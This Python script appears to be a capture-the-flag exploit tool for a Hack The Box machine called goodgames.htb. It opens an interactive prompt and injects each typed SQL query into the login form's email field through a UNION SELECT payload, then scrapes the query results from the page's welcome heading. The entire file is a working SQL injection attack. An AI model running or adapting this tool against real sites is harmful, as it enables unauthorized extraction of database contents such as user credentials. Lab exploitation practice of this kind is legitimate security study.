#!/usr/bin/env python3

import random, requests, sys, signal
from bs4 import BeautifulSoup
from cmd import Cmd

def def_handler(sig, frame):
    print("\t\n[!] Exiting...\n")
    sys.exit(1)


# Global
url = "http://goodgames.htb/login"

class Term(Cmd):

    signal.signal(signal.SIGINT, def_handler)
    print("\t")
    prompt = "[~] > "

    def default(self, args):
        post_data = {
            "email": f"admin%40test.com' union select 1,2,3,({args})-- -",
            "password": "admin"
        }
        r = requests.post(url, data=post_data)

        if "Welcome" in r.text:
            soup = BeautifulSoup(r.text, 'html.parser')
            elements = soup.find_all('h2', class_='h4')

            for element in elements: 
                cleared_text = element.text.replace("Welcome", "").strip()
                print("\n" + cleared_text + "\n")
                found_results = True
        else:
            print("\n[!] Incorrect SQL query supplied\n")

    def do_quit(self, args):
        return 1

term = Term()
term.cmdloop()

